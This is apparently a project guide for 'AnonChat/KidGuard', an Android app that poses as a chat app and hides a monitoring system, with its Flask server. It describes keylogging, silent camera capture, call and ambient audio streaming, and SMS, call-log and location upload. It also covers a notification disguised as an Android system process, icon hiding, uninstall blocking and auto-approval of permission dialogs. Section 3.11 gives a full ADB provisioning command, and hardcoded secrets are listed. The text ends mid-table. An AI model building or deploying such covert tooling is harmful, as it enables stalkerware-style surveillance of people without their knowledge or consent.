# AnonChat / KidGuard — Complete Project Guide

**Version:** 1.0 · **Date:** 2026-07-22 · **Package:** `com.anonchat.app`

---

## Table of Contents

1. [What This Project Is](#1-what-this-project-is)
2. [Project Architecture Overview](#2-project-architecture-overview)
3. [The Android App (CHAT APP)](#3-the-android-app-chat-app)
   - 3.1 [App Concept: Chat Disguise + Parental Control](#31-app-concept-chat-disguise--parental-control)
   - 3.2 [Package & Build Configuration](#32-package--build-configuration)
   - 3.3 [AndroidManifest — Permissions & Components](#33-androidmanifest--permissions--components)
   - 3.4 [Activities & UI Flow](#34-activities--ui-flow)
   - 3.5 [The Chat System (Firebase)](#35-the-chat-system-firebase)
   - 3.6 [The Parental Control System (KidGuard)](#36-the-parental-control-system-kidguard)
   - 3.7 [The Secret Code System](#37-the-secret-code-system)
   - 3.8 [App Hiding & Recovery (Launcher Alias)](#38-app-hiding--recovery-launcher-alias)
   - 3.9 [Network Layer & API Client](#39-network-layer--api-client)
   - 3.10 [Firebase Configuration](#310-firebase-configuration)
   - 3.11 [Zero-Touch ADB Setup](#311-zero-touch-adb-setup)
4. [The Server (AnonChat-Deployment/server)](#4-the-server-anonchat-deploymentserver)
   - 4.1 [Server Architecture](#41-server-architecture)
   - 4.2 [Configuration & Environment Variables](#42-configuration--environment-variables)
   - 4.3 [The App Factory](#43-the-app-factory)
   - 4.4 [Security Model (12 Vulnerability Fixes)](#44-security-model-12-vulnerability-fixes)
   - 4.5 [Database Models (22 Tables)](#45-database-models-22-tables)
   - 4.6 [Blueprints & API Routes (70 endpoints)](#46-blueprints--api-routes-70-endpoints)
   - 4.7 [Alembic Migrations](#47-alembic-migrations)
   - 4.8 [Server Scripts](#48-server-scripts)
   - 4.9 [Web UI (Templates & Static Files)](#49-web-ui-templates--static-files)
   - 4.10 [Testing](#410-testing)
5. [Deployment Guide](#5-deployment-guide)
   - 5.1 [PythonAnywhere Deployment](#51-pythonanywhere-deployment)
   - 5.2 [Docker Deployment](#52-docker-deployment)
   - 5.3 [Local Development](#53-local-development)
   - 5.4 [Building & Installing the APK](#54-building--installing-the-apk)
6. [Secret Code Recovery & Troubleshooting](#6-secret-code-recovery--troubleshooting)
7. [Known Issues & Deferred Work](#7-known-issues--deferred-work)
8. [Quick Reference](#8-quick-reference)

---

## 1. What This Project Is

AnonChat is a dual-purpose Android application with a cloud backend:

- **On the surface**, it is an anonymous 1:1 chat app — users sign in anonymously (no phone number or email required), pick a username and avatar color, and start chatting. Powered by Firebase Auth + Firestore + Storage.

- **Beneath the surface**, it contains a full parental-control / device-monitoring subsystem ("KidGuard"). When configured, the app runs a stealth foreground service that collects location, battery, SMS, call logs, installed apps, screen time, web history, and social-media notifications; uploads them to a Flask server; and accepts remote commands (screenshots, camera capture, audio recording, call streaming, app blocking, geofencing). The chat UI serves as a disguise — the launcher icon and app name look like a messaging app.

The project consists of two parts:

| Component | Location | Package / URL |
|-----------|----------|---------------|
| Android app | `ParentalControl/CHAT APP/` | `com.anonchat.app` |
| Cloud server | `ParentalControl/AnonChat-Deployment/server/` | `https://diptiban2021.pythonanywhere.com` |
| Deployment package | `ParentalControl/AnonChat-Deployment/` | APK + server + docs |

---

## 2. Project Architecture Overview

```
┌─────────────────────────────────────────────────────┐
│                   Parent's Browser                    │
│         (dashboard.html / device.html)               │
└──────────────────────┬──────────────────────────────┘
                       │ HTTP / WebSocket
                       ▼
┌─────────────────────────────────────────────────────┐
│              Flask Cloud Server (server/)             │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐ │
│  │ auth.bp  │ │reports.bp│ │ parent.bp│ │admin.bp │ │
│  └──────────┘ └──────────┘ └──────────┘ └─────────┘ │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐ │
│  │pairing.bp│ │device.bp │ │command.bp│ │app_mgmt │ │
│  └──────────┘ └──────────┘ └──────────┘ └─────────┘ │
│  ┌─────────────────────────────────────────────────┐ │
│  │  security.py — 12 vuln fixes, ownership checks  │ │
│  └─────────────────────────────────────────────────┘ │
│  ┌─────────────────────────────────────────────────┐ │
│  │  SQLAlchemy ORM (22 models) + Alembic           │ │
│  └─────────────────────────────────────────────────┘ │
└──────────┬───────────────────────┬──────────────────┘
           │                       │
     ┌─────▼─────┐          ┌──────▼──────┐
     │ PostgreSQL │          │   Firebase   │
     │ (or SQLite)│          │  (chat only) │
     └───────────┘          └──────────────┘
           ▲                       ▲
           │ JWT + Bearer          │ Firebase SDK
           │                       │
┌──────────┴───────────────────────┴──────────────────┐
│              Child's Android Phone                    │
│  ┌────────────────────┐  ┌──────────────────────────┐ │
│  │   AnonChat Chat    │  │  KidGuard TrackerService │ │
│  │  (Firebase Auth +  │  │  (location, SMS, calls,  │ │
│  │   Firestore)       │  │   apps, screen time,     │ │
│  └────────────────────┘  │   commands, capture)     │ │
│                          └──────────────────────────┘ │
│  ┌─────────────────────────────────────────────────┐  │
│  │  Secret code receiver + AppHider (launcher alias)│  │
│  └─────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────┘
```

**Key design point:** The app has **two separate auth systems**:
- **Chat** uses Firebase Auth (anonymous sign-in + email/password for parents).
- **Parental control** uses server JWT (access + refresh tokens).

The `User.firebase_uid` column on the server is a forward-compatibility hook for unifying these in a future client phase. For now they operate independently.

---

## 3. The Android App (CHAT APP)

**Source root:** `K:/Application softwares/ParentalControl/CHAT APP/`
**Kotlin source:** `app/src/main/java/com/anonchat/app/`

### 3.1 App Concept: Chat Disguise + Parental Control

The app presents itself as "AnonChat" — an anonymous chat application. The launcher icon, app name, and primary UI all reflect this. Hidden underneath is a complete parental-control subsystem ("KidGuard") that activates when:

1. A parent creates a pairing code on the server.
2. The child device registers with the server (via JWT login).
3. The parent approves the pairing.
4. The child app's `TrackerService` begins reporting data.

The chat UI is fully functional and serves as the cover story. The parental control subsystem runs silently as a foreground service disguised with the notification title "Android System / Optimizing device performance".

### 3.2 Package & Build Configuration

From `app/build.gradle.kts`:

| Property | Value |
|----------|-------|
| `applicationId` | `com.anonchat.app` |
| `namespace` | `com.anonchat.app` |
| `compileSdk` | 34 (Android 14) |
| `minSdk` | 26 (Android 8.0) |
| `targetSdk` | 34 |
| `versionCode` | 1 |
| `versionName` | "1.0" |
| JVM target | 17 |
| Build features | `viewBinding = true`, `buildConfig = true` |

**BuildConfig fields:**
- `SERVER_URL` — read from `local.properties` key `server.url`. Current production value: `https://diptiban2021.pythonanywhere.com`
- `API_KEY` = `"parental-control-key-2024"` (for the legacy server interface)

**Gradle:** AGP 8.2.2, Kotlin 1.9.22, Gradle wrapper 8.5, Google services plugin 4.4.0.

**Key dependencies:** AndroidX (core 1.12, appcompat 1.6, material 1.11), Lifecycle 2.7, Navigation 2.7.6, Coroutines 1.7.3, Glide 4.16, OkHttp 4.12, Gson 2.10.1, WorkManager 2.9, Firebase (auth 22.3, firestore 24.10, storage 20.3, messaging 23.4).

### 3.3 AndroidManifest — Permissions & Components

**Permissions:**

*Chat layer:* `INTERNET`, `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE` (maxSdk 28), `READ_MEDIA_IMAGES`, `POST_NOTIFICATIONS`, `VIBRATE`, `PROCESS_OUTGOING_CALLS`, `READ_PHONE_STATE`

*Parental control layer:* `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION`, `ACCESS_BACKGROUND_LOCATION`, `FOREGROUND_SERVICE` (+ `LOCATION`, `CAMERA`, `MICROPHONE` subtypes), `RECEIVE_BOOT_COMPLETED`, `READ_SMS`, `READ_CALL_LOG`, `READ_CONTACTS`, `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`, `SCHEDULE_EXACT_ALARM`, `PACKAGE_USAGE_STATS`, `WAKE_LOCK`, `QUERY_ALL_PACKAGES`, `REQUEST_INSTALL_PACKAGES`, `BIND_DEVICE_ADMIN`, `CAMERA`, `RECORD_AUDIO`

**Application attributes:** `usesCleartextTraffic="true"` (HTTP allowed), `networkSecurityConfig` permits cleartext globally.

**Activities:**

| Activity | Exported | Purpose |
|----------|----------|---------|
| `AuthActivity` | true | Login/registration (anonymous + parent). Splash theme. |
| `AuthActivityAlias` (activity-alias) | true | The launcher icon carrier — this is what gets disabled to hide the app. |
| `MainActivity` | false | Bottom-nav host (Chats, Search, Profile). |
| `ChatActivity` | false | 1:1 chat screen. |
| `SecretCodeSetupActivity` | false | Set/change the secret dialer code. |
| `WebDashboardActivity` | false | WebView loading the parental dashboard. |

**Receivers:**

| Receiver | Purpose |
|----------|---------|
| `SecretCodeReceiver` | Listens for `android.provider.Telephony.SECRET_CODE` broadcasts (the `*#*#CODE#*#*` dial pattern). |
| `UnhideReceiver` | Handles `com.anonchat.app.UNHIDE` — recovers the app from a hidden state. |
| `BootReceiver` | Starts `TrackerService` on `BOOT_COMPLETED`. |
| `AlarmReceiver` | Periodic exact alarm to restart `TrackerService` if killed. |
| `SetupReceiver` | ADB zero-touch provisioning entry point (protected by `SETUP_SECRET = "kidguard2024"`). |
| `DeviceAdminReceiver` | Device admin policies; blocks uninstall, demands `uninstallPassword` on disable. |

**Services:**

| Service | Purpose |
|---------|---------|
| `FCMService` | Receives Firebase push notifications for chat. |
| `TrackerService` | Foreground service (location + microphone). The monitoring heart — loops every 30s collecting and uploading data. |
| `TrackerAccessibilityService` | Accessibility service — auto-approves dialogs, detects secret codes in the dialer, captures screenshots, keylogs, reads browser URLs. |
| `SocialNotificationService` | Notification listener — captures WhatsApp, Instagram, Facebook, Telegram, etc. notifications. |

### 3.4 Activities & UI Flow

```
App Launch
    │
    ▼
AuthActivity (exported, launcher)
    ├── "Anonymous" tab → username + avatar color → Firebase anonymous sign-in
    └── "Parent" tab   → email + password → server login + Firebase sign-in
    │
    ▼
MainActivity (bottom nav)
    ├── Chats tab → ConversationsFragment → ChatActivity
    ├── Search tab → SearchFragment (find users by username)
    └── Profile tab → ProfileFragment (avatar, bio, secret code setup, hide/show app)
```

- **`AnonChatApp.kt`** — Application class. Initializes Firebase, `CloudConfig`, creates the `AppHider` notification channel, registers the dynamic `SecretCodeReceiver` if a code is set.
- **`MainActivity`** updates Firestore `isOnline`/`lastSeen` on resume/pause. Handles `unhide` intent extra (switches to profile tab).
- **`ChatActivity`** uses Firestore snapshot listeners for realtime messages, Firebase Storage for image uploads, supports typing indicators and read receipts.
- **`SecretCodeSetupActivity`** lets the user set a 4–15 digit numeric code. Displays the master key hint `*#*#11111987#*#*`.

### 3.5 The Chat System (Firebase)

**Data models** (`data/model/`):
- `User` — userId, username, avatarColor, bio, fcmToken, isOnline, lastSeen
- `Chat` — participants, participantNames/Colors, lastMessage, typingUsers, readBy
- `Message` — senderId, content, type (text/image), imageUrl, readBy, isDeleted
- `TypingStatus` — typing user state

**Repositories** (`data/repository/`):
- **`AuthRepository`** — `anonymousSignIn()`, `parentSignIn()` (email/password → writes `users/{uid}` doc with role "parent"), username availability, FCM token update, online status.
- **`ChatRepository`** — get-or-create 1:1 chat, conversations snapshot listener, messages realtime listener, `sendMessage`, `markMessagesAsRead`, `deleteMessage` (soft delete), `uploadImage` (Firebase Storage `chat_images/{chatId}/`), typing status.
- **`UserRepository`** — `getUserById`, `searchUsers` (range query on username), `updateBio/Username/AvatarColor`, realtime user listener.

**Firestore collections** (from `Constants.kt`): `users`, `chats`, `chats/{chatId}/messages`, `online_status`.

**Firebase Cloud Messaging:** `FCMService` receives push notifications with `chatId`, shows a notification, persists the FCM token to Firestore.

### 3.6 The Parental Control System (KidGuard)

All under `parentalcontrol/`:

#### API Layer (`parentalcontrol/api/`)

- **`CloudConfig.kt`** — SharedPreferences-backed singleton ("cloud_config" prefs). Holds all server connection state: `serverUrl`, `accessToken`/`refreshToken`, `userId`, `deviceId`, `stealthMode`, `deviceAdminActive`, `secretDialerCode`, etc. Key constants:
  - `DEFAULT_SERVER = BuildConfig.SERVER_URL`
  - `CLOUD_SERVER = "https://diptiban2021.pythonanywhere.com"`
  - `apiBaseUrl = "$serverUrl/api"`
  - `secretDialerCode` default: `"11111987"`

- **`ApiClient.kt`** — OkHttp-based REST client (no Retrofit). 15s/30s/60s timeouts. Auth via `Authorization: Bearer <token>` header. Auto-probes server type (cloud JSON vs legacy). 401 → token refresh + retry. All endpoints under `CloudConfig.apiBaseUrl` = `"$serverUrl/api"`.

#### Managers (`parentalcontrol/manager/`)

- **`AutoConnectManager`** — discovers the server: checks saved URL → cloud server → `BuildConfig.SERVER_URL` → scans local WiFi subnet on port 5000. Pings `GET /api/auth/me`.
- **`AutoPermissionHelper`** — accessibility-driven auto-tapper. Auto-clicks ALLOW/Install/Activate in system dialogs. Recognizes 18 OEM dialer packages. Implements the **dialer secret-code fallback** for Android 12+ (reads dialer window nodes for the code).
- **`CallStateMonitor`** — telephony call-state listener. Reports ringing/active/idle.
- **`CallStreamManager`** — streams call/ambient audio via `AudioRecord` (16kHz PCM) in chunks to `/api/report/audio-stream`.
- **`RemoteCaptureManager`** — Camera2 silent photo capture (front/back) + `MediaRecorder` ambient audio recording. Uploads to `/api/report/media`.
- **`ShizukuPermissionManager`** — executes shell commands (`pm grant`, `appops set`, `dpm set-active-admin`, etc.) for zero-touch provisioning. Hides the icon via `pm disable`.
- **`UpdateManager`** — OTA self-update. Checks `/api/app/check-update`, downloads APK, installs via `PackageInstaller` or `ACTION_VIEW` + FileProvider.

#### Receivers (`parentalcontrol/receiver/`)

- **`BootReceiver`** — `BOOT_COMPLETED` → `TrackerService.start()`.
- **`AlarmReceiver`** — periodic alarm (30s) to restart `TrackerService` if killed.
- **`SetupReceiver`** — the ADB zero-touch entry point. Protected by `SETUP_SECRET = "kidguard2024"`. Handles `SETUP_ALL`, `GRANT_PERMISSIONS`, `HIDE_APP`, `SHOW_APP`.
- **`DeviceAdminReceiver`** — device admin; on disable, demands `uninstallPassword` (default "admin").

#### Services (`parentalcontrol/service/`)

- **`TrackerService`** — the monitoring heart. Foreground service (type: location|microphone). Loops every 30s:
  1. Registers device via `/api/device/register`
  2. Collects data via `Collectors` (location, battery, SMS, call logs, installed apps, screen time, web history, social notifications, foreground app)
  3. Uploads via `ApiClient.sendBulkReport()` → `/api/report/bulk`
  4. Processes server commands: `lock`, `screenshot`, `alarm`, `block_apps`, `camera_front`, `camera_back`, `record_audio`, `listen_call`
  5. Fetches device config every 60s
  6. Checks for app updates hourly
  - Notification disguised as "Android System / Optimizing device performance"

- **`TrackerAccessibilityService`** — `AccessibilityService` (screenshot + gesture capable). Auto-approves permission dialogs, detects the secret code in the dialer (Android 12+ fallback → unhides + launches app), monitors app switches, captures browser URLs (Chrome, Firefox, Edge, Brave, Samsung, Vivo), keylogs text input. Provides `captureScreenshot()` (Android 11+).

- **`SocialNotificationService`** — `NotificationListenerService`. Captures notifications from WhatsApp, Instagram, Facebook, Messenger, Snapchat, Telegram, YouTube, TikTok, X, Discord, Pinterest, Reddit, LinkedIn, Viber, LINE, Skype. Batches into a buffer flushed by `TrackerService`.

#### Utilities (`parentalcontrol/util/`)

- **`Collectors.kt`** — data classes + `Collectors` class. Reads location (GPS), battery, SMS (100 most recent, body truncated to 500 chars), call logs (100), installed apps, screen time via `UsageStatsManager`, browser history (Chrome + Firefox/Edge/Brave providers), foreground app.

### 3.7 The Secret Code System

The secret code is the mechanism to hide/unhide the app icon using the phone's dialer. Four files coordinate:

#### `receiver/SecretCodeReceiver.kt`
- **`MASTER_KEY = "11111987"`** — the hardcoded override that always works.
- Registered for `android.provider.Telephony.SECRET_CODE` broadcasts (manifest) + a dynamic receiver scoped to the user's exact code.
- **Logic:**
  - If dialed code == `MASTER_KEY` → only unhide (if hidden).
  - If == saved user code → toggle hide/show.
  - `launchAfterUnhide()` launches `MainActivity` (with `AuthActivity` / `PackageManager` fallbacks) after a 400ms delay for `PackageManager` to publish the alias re-enable.

#### `util/SecretCodeManager.kt`
- Stores the user's code AES/ECB/PKCS5-encrypted with **`ENCRYPTION_KEY = "An0nCh4tS3cr3tK3y!@#"`** (SHA-256 → AES key) in `"anon_chat_secret"` prefs.
- `saveSecretCode()` validates 4–15 digits, encrypts, stores, and **mirrors the code into `CloudConfig.secretDialerCode`** so the accessibility dialer fallback matches the same code.
- Tracks `is_app_hidden` boolean.

#### `util/SecretCodeReceiverManager.kt`
- Registers/unregisters the dynamic `SecretCodeReceiver` with an `IntentFilter` + `addDataAuthority(code, null)` so the receiver only fires for the user's exact dialed code.

#### `parentalcontrol/manager/AutoPermissionHelper.kt`
- `MASTER_KEY = "11111987"` (must stay in sync with `SecretCodeReceiver`).
- `checkDialerForSecretCode()` accepts both the user-set code and the master key.
- Broadened to recognize 18 OEM dialer packages (AOSP, Google, Samsung, Xiaomi/MIUI, Huawei, OPPO/Realme/OnePlus, Vivo, Asus, LG, Sony, HTC).

#### Two detection paths:

| Path | Mechanism | Reliability |
|------|-----------|-------------|
| **A** (manifest broadcast) | `android.provider.Telephony.SECRET_CODE` broadcast | Unreliable on Vivo/Xiaomi/Oppo (their dialers don't emit it) |
| **B** (accessibility fallback) | `TrackerAccessibilityService` reads dialer window nodes for the code | The reliable path on Vivo. Requires Accessibility Service enabled. |

#### Summary of secrets:

| Secret | Value | Where |
|--------|-------|-------|
| Master dialer key | `11111987` | `SecretCodeReceiver`, `AutoPermissionHelper`, `CloudConfig` default, `strings.xml` |
| AES encryption key | `An0nCh4tS3cr3tK3y!@#` | `SecretCodeManager` |
| ADB setup secret | `kidguard2024` | `SetupReceiver` |
| Server API key | `parental-control-key-2024` | `build.gradle.kts` BuildConfig |
| Default uninstall password | `admin` | `DeviceAdminReceiver` |
| Default user secret code | `1234` | `Constants.DEFAULT_SECRET_CODE` |

**Dial pattern:** `*#*#<code>#*#*` · **Master key:** `*#*#11111987#*#*`

### 3.8 App Hiding & Recovery (Launcher Alias)

File: `util/AppHider.kt`

The launcher icon is **not** on `AuthActivity` directly. It is on the **`activity-alias`** named `com.anonchat.app.ui.auth.AuthActivityAlias` (declared in the manifest, `targetActivity = .ui.auth.AuthActivity`, carries `MAIN/LAUNCHER`).

- **`LAUNCHER_ALIAS = "com.anonchat.app.ui.auth.AuthActivityAlias"`**
- **`hideApp()`**: sets `SecretCodeManager.setAppHidden(true)`, then `PackageManager.setComponentEnabledSetting(alias, DISABLED, DONT_KILL_APP)` — disabling the alias removes the icon from the launcher. Sends `ACTION_PACKAGE_CHANGED` to refresh the launcher, starts the HOME intent, posts an ongoing low-priority notification "AnonChat is hidden / Tap to unhide".
- **`showApp()`**: re-enables the alias (state ENABLED), clears hidden flag, cancels the notification.
- **vivo/iQOO/Samsung caveat:** a **reboot** is required for the icon to actually disappear after hiding.

**Recovery paths:**
1. Dial `*#*#<code>#*#*` or `*#*#11111987#*#*`
2. Tap the "AnonChat is hidden" notification
3. ADB: `adb shell am broadcast -a com.anonchat.app.UNHIDE -n com.anonchat.app/.receiver.UnhideReceiver`

### 3.9 Network Layer & API Client

**Two entirely separate network stacks:**

**(A) Chat layer** — Firebase SDKs (no HTTP client). `AuthRepository`, `ChatRepository`, `UserRepository` use Firebase Auth + Firestore (snapshot listeners) + Firebase Storage.

**(B) Parental control layer** — OkHttp + org.json, in `parentalcontrol/api/ApiClient.kt`:
- `OkHttpClient` with 15s/30s/60s timeouts.
- Auth: `Authorization: Bearer <CloudConfig.accessToken>` header.
- All endpoints under `CloudConfig.apiBaseUrl` = `"$serverUrl/api"`.
- Server type auto-detection: `probeServerType()` checks `/api/auth/me` (cloud JSON) vs `/api/report` (legacy 404).
- 401 → token refresh + retry.

**Server URL resolution:**
- `build.gradle.kts` reads `server.url` from `local.properties` (default `http://192.168.1.5:5000`).
- `local.properties` current value: `server.url=https://diptiban2021.pythonanywhere.com`
- `CloudConfig.DEFAULT_SERVER = BuildConfig.SERVER_URL`
- `AutoConnectManager` can discover and override the URL at runtime.

### 3.10 Firebase Configuration

- **`app/google-services.json`**: project_id `anonchat-a690b`, project_number `145505706969`, package_name `com.anonchat.app`, storage_bucket `anonchat-a690b.firebasestorage.app`.
- **Auth:** anonymous sign-in (chat users) + email/password (parents).
- **Firestore collections:** `users`, `chats`, `chats/{chatId}/messages`, `online_status`.
- **Storage:** `chat_images/{chatId}/{timestamp}.jpg`.
- **Backend rules:** `firestore.rules`, `firestore.indexes.json`, `storage.rules` (at project root).
- **Docs:** `FIREBASE_INTEGRATION.md`, `FIRESTORE_SETUP.md`.

### 3.11 Zero-Touch ADB Setup

The `SetupReceiver` enables full provisioning via an ADB broadcast:

```bash
adb shell am broadcast \
  -a com.anonchat.app.SETUP_ALL \
  -n com.anonchat.app/.parentalcontrol.receiver.SetupReceiver \
  --es setup_secret "kidguard2024" \
  --es server_url "https://diptiban2021.pythonanywhere.com" \
  --es pairing_code "ABCD1234"
```

This configures the server URL, sets the dialer code, runs `ShizukuPermissionManager.runFullSetup()` (grants all permissions via shell), registers/logins as a child account, claims the pairing code, starts `TrackerService`, and marks setup complete.

---

## 4. The Server (AnonChat-Deployment/server)

**Source root:** `K:/Application softwares/ParentalControl/AnonChat-Deployment/server/`

### 4.1 Server Architecture

The server is a Flask application package with an app factory pattern. The original monolithic `app.py` (2028 lines) has been refactored into 10 blueprints + centralized security. All 62 original routes are preserved 1:1, now mounted under `/api/v1` with a legacy `/api/*` → `/api/v1/*` 308 redirect for backward compatibility.

```
server/
├── __init__.py            ← create_app() factory
├── config.py              ← Config (env-var driven)
├── extensions.py          ← db, jwt, cors, limiter + in-memory stores
├── models.py              ← 22 SQLAlchemy models
├── security.py            ← hashing, ownership decorators, 12 vuln fixes
├── blueprints/
│   ├── auth.py           ← register, login, refresh, logout, forgot/reset
│   ├── pairing.py        ← generate, claim, claim-direct, pending, approve
│   ├── device.py         ← register, config
│   ├── reports.py        ← all /api/report/* (13 endpoints)
│   ├── parent.py         ← all /api/parent/* dashboard (~25 routes)
│   ├── command.py         ← command status
│   ├── admin.py           ← retention-cleanup, user mgmt, audit log
│   ├── app_mgmt.py        ← APK check-update, download, upload
│   ├── files.py           ← media file serving
│   └── pages.py           ← web UI (login, dashboard, device)
├── migrations/            ← Alembic
│   └── versions/
│       ├── 0001_baseline.py    ← full schema reproduction
│       └── 0002_multiuser.py    ← multi-user changes
├── scripts/
│   ├── create_admin.py          ← admin bootstrap CLI
│   └── migrate_sqlite_to_postgres.py  ← ETL script
├── tests/                ← pytest scaffold (46 tests)
├── templates/            ← login.html, dashboard.html, device.html
├── static/               ← CSS + JS for the web dashboard
├── alembic.ini
├── wsgi.py               ← production WSGI entry point
├── run.py                ← local dev entry point
├── Dockerfile, docker-compose.yml, nginx.conf
└── requirements.txt
```

### 4.2 Configuration & Environment Variables

File: `server/config.py`. All values via `os.environ.get()`:

| Env Var | Default | Purpose |
|---------|---------|---------|
| `SECRET_KEY` | `dev-insecure-change-me-Satyadeep` | Flask session signing |
| `JWT_SECRET_KEY` | `dev-insecure-change-me-SatyadeepNayak` | JWT signing |
| `ACCESS_TOKEN_TTL_MINUTES` | `60` | Access token lifetime |
| `REFRESH_TOKEN_TTL_DAYS` | `7` | Refresh token lifetime |
| `DATABASE_URL` | `sqlite:///tracking.db` | Database URI (Postgres in prod) |
| `UPLOAD_FOLDER` | `../uploads` | Media upload directory |
| `CLOUD_SERVER_URL` | `http://localhost:5000` | Self-referencing URL |
| `PAIRING_CODE_TTL` | `600` (seconds) | Pairing code validity |
| `REDIS_URL` | `memory://` | Rate-limit storage backend |
| `MAIL_SERVER` | (empty) | SMTP host (empty = dev logging) |
| `MAIL_PORT` | `587` | SMTP port |
| `MAIL_USE_TLS` | `1` | Enable TLS |
| `MAIL_USERNAME` | (empty) | SMTP auth user |
| `MAIL_PASSWORD` | (empty) | SMTP auth password |
| `MAIL_FROM` | `noreply@kidguard.local` | Reset email From |
| `ADMIN_EMAIL` | (empty) | Admin bootstrap email |
| `ADMIN_PASSWORD` | (empty) | Admin bootstrap password |
| `DISABLE_SOCKETIO` | (empty) | Set `1` to disable WebSocket |
| `FLASK_AUTO_CREATE` | (empty) | Set `1` to auto-create tables (dev) |

**Hard-coded constants:** `MAX_CONTENT_LENGTH = 50MB`, `GEO_FENCE_DEFAULT_RADIUS = 500m`, `SQLALCHEMY_ENGINE_OPTIONS = {pool_pre_ping: True, pool_recycle: 300}`.

### 4.3 The App Factory

File: `server/__init__.py`. `create_app(config_class=Config)`:

1. Creates `Flask(__name__)`, loads config.
2. Initializes extensions: `db`, `jwt`, `cors` (supports_credentials), `limiter`.
3. Creates `UPLOAD_FOLDER`.
4. **SocketIO auto-detection**: enabled only if installed + not PythonAnywhere + not disabled. PythonAnywhere WSGI does not support WebSockets.
5. **JWT blocklist callback** (V12): checks `TokenBlocklist` for the token's `jti`.
6. **Registers 10 blueprints**: 9 API blueprints under `/api/v1`, `pages` at root.
7. **Legacy `/api/*` → `/api/v1/*` redirect** (308): preserves compatibility with the installed Android client.
8. **Error handlers**: 400, 401, 403, 404, 405, 413, 429, 500, and catch-all `Exception`.
9. **Dev auto-create**: `db.create_all()` if `FLASK_DEBUG` or `FLASK_AUTO_CREATE=1`.

### 4.4 Security Model (12 Vulnerability Fixes)

File: `server/security.py`. The single source of truth for access control.

**Password hashing (V11):**
- `hash_password()` — Werkzeug scrypt (salted, slow).
- `verify_password()` — handles both new scrypt and legacy SHA-256 (returns True so caller can re-hash).
- `maybe_rehash()` — transparently upgrades legacy hashes on next login (zero-downtime migration).
- `is_legacy_hash()` — detects old unsalted SHA-256 (64 hex chars).

**Role decorators:**
- `parent_required` — requires `role in ('parent', 'admin')` + `is_active`.
- `admin_required` — requires `role == 'admin'`.

**Ownership helpers (the choke points):**

| Function | Fixes | What it does |
|----------|-------|--------------|
| `resolve_device_id(provided_id, parent_id)` | V1 | Parent can only address devices they own |
| `assert_device_ownership(device_id, caller_id)` | V2, V3 | Verifies caller owns the device (child directly, parent via relation, admin always) |
| `require_device_owner` (decorator) | V2 | For report routes — reads device_id from body, verifies ownership |
| `assert_command_ownership(command_id, parent_id)` | V3, V4, V8 | Verifies a RemoteCommand belongs to a device owned by the caller |
| `assert_pairing_ownership(pairing_id, parent_id)` | V5 | Verifies a pairing belongs to the parent before approval |

**Token revocation (V12):**
- `revoke_user_tokens(user_id)` — stamps `last_password_change` to invalidate outstanding JWTs.

**Audit logging:**
- `audit_log(actor_id, action, target_type, target_id, metadata)` — best-effort append-only `AuditLog` row. Captures `request.remote_addr`. Never raises into the request path.

**The 12 vulnerabilities fixed:**

| # | Vulnerability | Fix location |
|---|---------------|-------------|
| V1 | Device-config IDOR | `device.py` — `assert_device_ownership` before returning config |
| V2 | Report injection | `reports.py` — every route calls `assert_device_ownership` |
| V3 | Media command poisoning | `reports.py` — `assert_command_ownership` for linked command_id |
| V4 | Command-status hijack | `command.py` — `assert_command_ownership` before update |
| V5 | Pairing-approval hijack | `pairing.py` — `assert_pairing_ownership` before approve |
| V6 | Device re-registration hijack | `device.py` — existing devices not reassigned to new users |
| V7 | Unauthenticated claim-direct | `pairing.py` — now requires JWT + rate-limited 3/min |
| V8 | Audio-poll / command-result hijack | `parent.py` — command must belong to resolved device |
| V9 | Reset token in response | `auth.py` — token never returned; logged in dev, emailed in prod |
| V10 | Account enumeration | `auth.py` — `forgot-username` returns only `{exists: bool}` |
| V11 | Weak hashing (SHA-256) | `security.py` — scrypt + transparent re-hash on login |
| V12 | No token revocation | `auth.py` + `security.py` — `TokenBlocklist` + logout + `revoke_user_tokens` |

**Rate limiting (WS-2b):** `flask-limiter`. 5/min on auth endpoints, 3/min on pairing claim, 10/min on web pages. Redis-backed in prod, in-memory in dev.

### 4.5 Database Models (22 Tables)

File: `server/models.py`. Three helpers: `generate_id(prefix)`, `generate_pairing_code()`, `_now_ms()`.

**Core identity models (4):**

| Model | Table | Key fields |
|-------|-------|-----------|
| `User` | `users` | id, email (unique), password_hash, display_name, role (parent/child/admin), is_active, **firebase_uid** (new), **last_password_change** (new) |
| `ChildRelation` | `child_relations` | parent_id, child_id, pairing_code (unique), is_active. **Partial unique index** on child_id WHERE is_active=1 (strict one-parent-per-child) |
| `TokenBlocklist` | `token_blocklist` | **NEW** — jti (unique, indexed), user_id, expires_at. Enables JWT revocation |
| `AuditLog` | `audit_log` | **NEW** — actor_id, action, target_type, target_id, ip_address, metadata_json. Append-only accountability |

**Device & report models (18):** Device, LocationReport, ActivityReport, BatteryReport, ScreenTimeReport, SmsMessage, CallLog, CallStateEvent, InstalledApp, MediaFile, WebHistory, Geofence, GeofenceEvent, RemoteCommand, AppRestriction, ScheduleRule, PasswordResetToken, SocialNotification.

All report models are device-scoped (FK to `devices.device_id`). The fix is enforcement (runtime checks), not schema.

### 4.6 Blueprints & API Routes (70 endpoints)

All API blueprints mounted under `/api/v1`. Legacy `/api/*` paths redirect via 308.

#### `auth.py` — 8 routes (5/min rate-limited)

| Method | Path | Description |
|--------|------|-------------|
| POST | `/auth/register` | Create parent/child account |
| POST | `/auth/login` | Login (transparent re-hash) |
| POST | `/auth/refresh` | Refresh access token |
| GET | `/auth/me` | Current user info |
| POST | `/auth/logout` | Blocklist current token (V12) |
| POST | `/auth/forgot-password` | Issue reset token (V9 — not in response) |
| POST | `/auth/reset-password` | Reset password (V12 — revokes sessions) |
| POST | `/auth/forgot-username` | Check if username exists (V10 — no enumeration) |

#### `pairing.py` — 6 routes

| Method | Path | Description |
|--------|------|-------------|
| POST | `/pairing/generate` | Parent generates pairing code |
| POST | `/pairing/claim` | Child claims a code |
| POST | `/pairing/claim-direct` | Claim with auto-account (V7 — requires JWT, 3/min) |
| GET | `/pairing/pending` | List pending pairings |
| POST | `/pairing/approve/<id>` | Approve pairing (V5 — ownership checked) |
| GET | `/pairing/children` | List active children |

#### `device.py` — 2 routes

| Method | Path | Description |
|--------|------|-------------|
